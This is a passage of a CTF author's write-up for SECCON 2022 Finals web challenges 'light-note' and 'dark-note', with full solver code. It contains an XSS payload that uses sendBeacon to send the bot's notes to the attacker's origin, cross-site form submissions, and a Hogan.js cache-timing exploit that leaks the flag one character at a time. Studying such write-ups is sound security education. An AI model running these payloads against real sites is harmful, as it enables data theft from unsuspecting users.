      await sleep(3 * 1000);
      await reportUrl(
        `${ATTACK_BASE_URL}?${new URLSearchParams({
          baseUrl: "http://localhost:3000",
        })}`
      );

      await sleep(20 * 1000);
      fail("Failed");
    }
  );
};
start();
```

`index.html`:
```html
<body>
  <script>
    const params = new URLSearchParams(location.search);
    const baseUrl = params.get("baseUrl");

    const sleep = async (msec) =>
      new Promise((resolve) => setTimeout(resolve, msec));

    const createNote = (note) => {
      const innerHtml = `
        <form action="${baseUrl}/api/notes/create" method="post" target="_blank">
          <input type="text" name="note">
        </form>
      `;
      document.body.innerHTML += innerHtml;
      const form = document.forms[document.forms.length - 1];
      form.note.value = note;
      form.submit();
    };

    const main = async () => {
      const note1 = `
        <form id="noteTmpl"></form>
        <button name="content" form="noteTmpl">
          <form class="note">
            <input name="setHTML">
          </form>
          <p class="delete"></p>
        </button>
        <img name="nodeType">
      `.trim();

      const note2 =
        "<" +
        `
          <img src=0 onerror="navigator.sendBeacon('${location.origin}', notes.textContent)">
        `.trim();

      createNote(note1); // DOM Clobbering
      await sleep(1000);
      createNote(note2); // XSS
      await sleep(1000);

      location = baseUrl;
    };
    main();
  </script>
</body>
```

### Flag[^light-note-flag]

```
SECCON{induction_i5_one_0f_my_favarite_g4mes}
```

[^light-note-flag]: https://store.steampowered.com/app/381890/Induction

## [web 500] dark-note

- International: 0 solved / 10
- Domestic: 0 solved / 12
- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202302_SECCON_CTF_2022_Finals/web/dark-note

Description:

> I created an incredibly blazing-fast note application!
>
> Instancer:
> ```
> nc dark-note.{int,dom}.seccon.games 1337
> ```
>
> Note: The instancer has no bugs or vulnerabilities (at least in my intended solution).

### Overview

This is also a note application. You can create and delete notes:

![](/images/2023/20230217-seccon-finals-dark-note-01.png)

The server uses a template engine [Hogan.js](https://github.com/twitter/hogan.js/) when rendering your notes:

![](/images/2023/20230217-seccon-finals-dark-note-02.png)

Unlike light-note, the service has a login/signup system and you can change your emoji:

![](/images/2023/20230217-seccon-finals-dark-note-03.png)
![](/images/2023/20230217-seccon-finals-dark-note-04.png)

Also, you can report a URL to a bot, then the bot executes the following program:

```javascript
const visit = async (attackUrl, { appPort, basicUsername, basicPassword }) => {
  console.log(`start: ${JSON.stringify(attackUrl)}`);
  const baseUrl = `http://${APP_HOST}:${appPort}`;

  const name = crypto.randomBytes(12).toString("base64");
  const password = crypto.randomBytes(12).toString("base64");

  const browser = await puppeteer.launch({
    headless: false,
    executablePath: "/usr/bin/google-chrome-stable",
    args: ["--no-sandbox"],
  });
  const context = await browser.createIncognitoBrowserContext();

  try {
    const page1 = await context.newPage();
    /* snip */

    await page1.goto(`${baseUrl}/signup`, { timeout: 3000 });
    await sleep(0.5 * 1000);

    // Create an account
    await page1.waitForSelector("#name");
    await page1.type("#name", name);
    await page1.waitForSelector("#password");
    await page1.type("#password", password);
    await page1.waitForSelector("#submit");
    await page1.click("#submit");
    await sleep(0.5 * 1000);

    // Create a note for each of the characters of `PADDED_FLAG`
    for (const chr of PADDED_FLAG) {
      await page1.waitForSelector("#note");
      await page1.type("#note", chr);
      await page1.waitForSelector("#createNote");
      await page1.click("#createNote");
      await sleep(0.5 * 1000);
    }

    await page1.close();
    await sleep(1 * 1000);

    //

    const page2 = await context.newPage();
    /* snip */

    // Access to the given URL
    await page2.goto(attackUrl, { timeout: 3000 });
    await sleep(60 * 1000);

    await page2.close();
  } catch (e) {
    console.log(e);
  }

  await context.close();
  await browser.close();

  console.log(`end: ${JSON.stringify(attackUrl)}`);
};
```

The bot creates a note for each character of a flag string:

- `S`, `E`, `C`, `C`, `O`, `N`, `{`, ..., `}`

### Solution

The HTML file is as follows:

```html
<!DOCTYPE html>
<html data-theme="dark">
<head>
  <meta charset="UTF-8">
  <title>Dark Note</title>
  <link rel="stylesheet" href="https://unpkg.com/@picocss/pico@latest/css/pico.min.css">
</head>
<body>
  <main class="container">
    <article>
      <h2 style="margin-bottom: 1rem">⚡ Dark Note</h2>
      <table>
        <tbody id="notes"></tbody>
      </table>
      <input type="text" id="note" name="note" required placeholder="Hello, {{name}} {{emoji}}">
      <div style="display: flex; justify-content: end;">
        <a id="createNote" href="#" role="button">Create</a>
      </div>
    </article>
    <article>
      <select id="emoji" name="emoji" value="1" required></select>
      <div style="display: flex; justify-content: end;">
        <a id="changeEmoji" href="#" role="button">Change emoji</a>
      </div>
    </article>
    <article>
      <input type="text" id="url" name="url" required placeholder="https://example.com">
      <div style="display: flex; justify-content: end;">
        <a id="report" href="#" role="button">Report</a>
      </div>
    </article>
    <p style="display: flex; justify-content: end;">
      <a href="/logout">Logout</a></p>
    </p>
  </main>
  <template id="noteTmpl">
    <tr>
      <th>
        <nav>
          <ul><li class="note" style="word-break: break-all;"></li></ul>
          <ul><li><a href="#" role="button" class="delete secondary">Delete</a></li></ul>
        </nav>
      </th>
    </tr>
  </template>
  <script>
    /* snip */

    const refresh = async () => {
      const notes = await fetch("/api/notes").then(r => r.json());

      const root = document.getElementById("notes");
      root.innerHTML = "";
      for (const [index, note] of Object.entries(notes)) {
        const elm = document.getElementById("noteTmpl").content.cloneNode(true);
        elm.querySelector(".note").textContent = note;
        elm.querySelector(".delete").addEventListener("click", async () => {
          await deleteNote(index);
          await refresh();
        });
        root.appendChild(elm);
      }
    };

    const init = async () => {
      await refresh();

      /* snip */
    };

    document.addEventListener("DOMContentLoaded", init);
  </script>
</body>
</html>
```

```javascript
elm.querySelector(".note").textContent = note;
```

The assignment of notes uses `textContent`. So, XSS seems impossible.

The server-side code for rendering notes is as follows:

```javascript
const crypto = require("node:crypto");
const Hogan = require("hogan.js");

const render = (text, context) => {
  const sanitized = text.replace(/[#\^<\$\/!>=&]/g, "");
  const rendered = Hogan.compile(sanitized).render(context);
  return rendered;
};

class User {
  #locals;

  constructor(name, password, emoji) {
    const id = crypto.randomBytes(32).toString("base64");

    const notes = new Proxy([], {
      get: (target, key, receiver) => {
        return typeof key === "string" && isFinite(key)
          ? render(target[key], this.#locals)
          : Reflect.get(target, key, receiver);
      },
    });

    this.#locals = {
      id,
      name,
      password,
      emoji,
      notes,
    };
  }

  /* snip */
}
```

There is a Proxy using a `get` handler in an array `notes`. If you access `notes[i]`, then you will get an rendered note with `render`. Obviously, there is SSTI for `Hogan.js`, but `text.replace(/[#\^<\$\/!>=&]/g, "")` limits various features of `Hogan.js`. "SSTI to RCE" also seems impossible.

Here, read the source code of `Hogan.js`:

- ref. https://github.com/twitter/hogan.js/blob/v3.0.2/lib/compiler.js#L407-L422

```javascript
  Hogan.compile = function(text, options) {
    options = options || {};
    var key = Hogan.cacheKey(text, options);
    var template = this.cache[key];

    if (template) {
      var partials = template.partials;
      for (var name in partials) {
        delete partials[name].instance;
      }
      return template;
    }

    template = this.generate(this.parse(this.scan(text, options.delimiters), text, options), text, options);
    return this.cache[key] = template;
  }
```

The template engine uses cache mechanism, and the cache key is:

```javascript
  Hogan.cacheKey = function(text, options) {
    return [text, !!options.asString, !!options.disableLambda, options.delimiters, !!options.modelGet].join('||');
  }
```

If the `text` was already evaluated, the engine skips the compile process for `text` and uses the cached value as a compiled result.

In REPL of Node.js, let's confirm the cache effect:
```javascript
> const Hogan = require("hogan.js");
undefined
>
> const render = (text, context = {}) => {
...   const sanitized = text.replace(/[#\^<\$\/!>=&]/g, "");
...   const rendered = Hogan.compile(sanitized).render(context);
...   return rendered;
... };
undefined
>
> const measure = (f) => {
...   const start = performance.now();
...   f();
...   const end = performance.now();
...   return end - start;
... };
undefined

> measure(() => render("{{x}}{{x}}{{x}}a"))
1.5557399988174438
> measure(() => render("{{x}}{{x}}{{x}}a"))
0.09384399652481079
> measure(() => render("{{x}}{{x}}{{x}}b"))
0.8712370097637177
> measure(() => render("{{x}}{{x}}{{x}}b"))
0.11031201481819153

> measure(() => render("{{x}}{{x}}{{x}}".repeat(10000) + "a"))
1345.8155919909477
> measure(() => render("{{x}}{{x}}{{x}}".repeat(10000) + "a"))
20.339904010295868
> measure(() => render("{{x}}{{x}}{{x}}".repeat(10000) + "b"))
1170.0819569826126
> measure(() => render("{{x}}{{x}}{{x}}".repeat(10000) + "b"))
7.888740986585617
```

The rendering time depends largely on whether cache is used or not. Is it possible to use the difference as an oracle to leak `notes[i]`, which is the `i`-th character in the flag string?

To construct the oracle, you need to let the bot render the following `text` as a note:

```javascript
const i = /* An index `i` where you want to leak the i-th character */;
const user = /* A User object of the bot */;
const text = `${i}-${user.getNotes()[i]}-${"{{x}}".repeat(20000)}`;
```

Btw, the `deleteNote` function uses `Array.prototype.splice` to delete a note:
```javascript
  deleteNote(index) {
    if (
      typeof index !== "number" ||
      Number.isNaN(index) ||
      index < 0 ||
      index >= this.#locals.notes.length
    ) {
      throw new Error("Failed to delete a note");
    }
    this.#locals.notes.splice(index, 1);
  }
```

There is an interesting behavior between `splice` and `Proxy`:

```javascript
> const notes = new Proxy([], {
...   get: (target, key, receiver) => {
...     return typeof key === "string" && isFinite(key)
...       ? target[key] + "x"
...       : Reflect.get(target, key, receiver);
...   },
... });
undefined

> notes.push("1"); notes.push("2"); notes.push("3");
3
> notes
Proxy [ [ '1', '2', '3' ], { get: [Function: get] } ]

> notes.splice(1, 1)
[ '2x' ]
> notes
Proxy [ [ '1', '3x' ], { get: [Function: get] } ]
> notes[1]
'3xx' // '3' -> '3x' -> '3xx'
```

When `notes.splice(1, 1)` was executed, the `get` handler of Proxy was **implicitly** called and `"3"` changed to `"3x"`. So, the final result of `notes[1]` was `"3xx"` because the `get` handler was called again.

My solution abuses the above behavior to construct a time-based oracle.

Firstly, my solver lets the bot pollute cache in the template engine as follows (in `index.html`):
```javascript
    const polluteCache = async (flagIndex) => {
      const evilNote = `${flagIndex}-{{notes.${flagIndex}}}-{{emoji}}`;
      createNote("dummy");
      await sleep(500);
      createNote(evilNote);
      await sleep(500);
      deleteNote(MAX_FLAG_LENGTH);
      await sleep(1000);
      deleteNote(MAX_FLAG_LENGTH);
      await sleep(1000);
    }

    const main = async () => {
      const heavyTemplate = "{{x}}".repeat(HEAVY_LEVEL);
      changeEmoji(heavyTemplate);
      await sleep(1000);

      const known = "SECCON{";
      for (let i = known.length; i<MAX_FLAG_LENGTH; i++) {
        await polluteCache(i);
      }
      navigator.sendBeacon(`${location.origin}/start-leak`);
    };
    main();
```

Next, my solver leaks the flag characters using the time-based oracle as follows (in `index.js`):
```javascript
const leak = async (flagIndex, cookie) => {
  let minTime = 1e10;
  let minChar;
  for (const char of CHARS) {
    const note = `${flagIndex}-${char}-${"{{x}}".repeat(HEAVY_LEVEL)}`;
    await createNote(note, cookie);
    const time = await measureTime(cookie);
    await deleteNote(0, cookie);
    if (time < minTime) {
      minTime = time;
      minChar = char;
    }
  }
  if (!minChar) fail(`Failed at ${flagIndex}`);

  return minChar;
};

const exploit = async () => {
  /* snip */
  const cookie = /* snip (a cookie of your account) */;

  let prefix = "SECCON{";
  while (!prefix.endsWith("}")) {
    prefix += await leak(prefix.length, cookie);
    console.log(prefix);
    await sleep(500);
  }

  console.log(`Flag: ${prefix}`);
  process.exit(0);
};
```

See my solver below for details.

### Solver

`index.js`:
```javascript
const fastify = require("fastify")();
const fs = require("node:fs").promises;
const crypto = require("node:crypto");

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_BASE_URL = process.env.SECCON_BASE_URL ?? fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL = process.env.ATTACK_BASE_URL ?? fail("No ATTACK_BASE_URL");
const LISTEN_PORT = "8080";

const CHARS = "}_abcdefghijklmnopqrstuvwxyz0123456789";
const HEAVY_LEVEL = 20000;

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const reportUrl = async (url) => {
  const res = await fetch(`${SECCON_BASE_URL}/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      url,
    }),
  }).then((r) => r.text());
  console.log(res); // "Received :)"
};

const createNote = (note, cookie) =>
  fetch(`${SECCON_BASE_URL}/api/notes/create`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Cookie: cookie,
    },
    body: JSON.stringify({
      note,
    }),
  });

const deleteNote = (index, cookie) =>
  fetch(`${SECCON_BASE_URL}/api/notes/delete`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Cookie: cookie,
    },
    body: JSON.stringify({
      index,
    }),
  });

const measureTime = async (cookie) => {
  const start = performance.now();
  await fetch(`${SECCON_BASE_URL}/api/notes`, {
    method: "GET",
    headers: {
      Cookie: cookie,
    },
  });
  return performance.now() - start;
};

const leak = async (flagIndex, cookie) => {
  let minTime = 1e10;
  let minChar;
  for (const char of CHARS) {
    const note = `${flagIndex}-${char}-${"{{x}}".repeat(HEAVY_LEVEL)}`;
    await createNote(note, cookie);
    const time = await measureTime(cookie);
    await deleteNote(0, cookie);
    if (time < minTime) {
      minTime = time;
      minChar = char;
    }
  }
  if (!minChar) fail(`Failed at ${flagIndex}`);

  return minChar;
};

const exploit = async () => {
  const name = crypto.randomBytes(12).toString("base64");
  const password = crypto.randomBytes(12).toString("base64");

  const res = await fetch(`${SECCON_BASE_URL}/signup`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      name,
      password,
      emoji: "x",
    }),
    redirect: "manual",
  });
  const cookie = res.headers.get("Set-Cookie").split(";")[0];

  let prefix = "SECCON{";
  while (!prefix.endsWith("}")) {
    prefix += await leak(prefix.length, cookie);
    console.log(prefix);
    await sleep(500);
  }

  console.log(`Flag: ${prefix}`);
  process.exit(0);
};

const start = async () => {
  fastify.get("/", async (req, reply) => {
    const html = await fs.readFile("index.html");
    return reply.type("text/html; charset=utf-8").send(html);
  });

  fastify.post("/start-leak", async (req, reply) => {
    console.log("leak:");
    exploit();
    return "";
  });

  fastify.listen(
    { port: LISTEN_PORT, host: "0.0.0.0" },
    async (err, address) => {
      if (err) fail(err.toString());

      await sleep(2 * 1000);
      await reportUrl(
        `${ATTACK_BASE_URL}?${new URLSearchParams({
          baseUrl: "http://web:3000",
        })}`
      );

      await sleep(180 * 1000);
      fail("Failed");
    }
  );
};
start();
```

`index.html`:
```html
<body>
  <script>
    const params = new URLSearchParams(location.search);
    const baseUrl = params.get("baseUrl");

    const MAX_FLAG_LENGTH = 16;
    const HEAVY_LEVEL = 20000;

    const sleep = async (msec) =>
      new Promise((resolve) => setTimeout(resolve, msec));

    const createNote = (note) => {
      const innerHtml = `
        <form action="${baseUrl}/api/notes/create" method="post" target="_blank">
          <input type="text" name="note" value="${note}">
        </form>
      `;
      document.body.innerHTML += innerHtml;
      document.forms[document.forms.length - 1].submit();
    };

    const deleteNote = (index) => {
      const innerHtml = `
        <form action="${baseUrl}/api/notes/delete" method="post" target="_blank">
          <input type="text" name="index" value="${index}">
        </form>
      `;
      document.body.innerHTML += innerHtml;
      document.forms[document.forms.length - 1].submit();
    };

    const changeEmoji = (emoji) => {
      const innerHtml = `
        <form action="${baseUrl}/api/emojis/change" method="post" target="_blank">
          <input type="text" name="emoji" value="${emoji}">
        </form>
      `;
      document.body.innerHTML += innerHtml;
      document.forms[document.forms.length - 1].submit();
    };

    const polluteCache = async (flagIndex) => {
      const evilNote = `${flagIndex}-{{notes.${flagIndex}}}-{{emoji}}`;
      createNote("dummy");
      await sleep(500);
      createNote(evilNote);
      await sleep(500);
      deleteNote(MAX_FLAG_LENGTH);
      await sleep(1000);
      deleteNote(MAX_FLAG_LENGTH);
      await sleep(1000);
    }

    const main = async () => {
      const heavyTemplate = "{{x}}".repeat(HEAVY_LEVEL);
      changeEmoji(heavyTemplate);
      await sleep(1000);

      const known = "SECCON{";
      for (let i = known.length; i<MAX_FLAG_LENGTH; i++) {
        await polluteCache(i);
      }
      navigator.sendBeacon(`${location.origin}/start-leak`);
    };
    main();
  </script>
</body>
```

### Flag[^dark-note-flag]

```
SECCON{d0wnwe11}
```

[^dark-note-flag]: https://store.steampowered.com/app/360740/Downwell
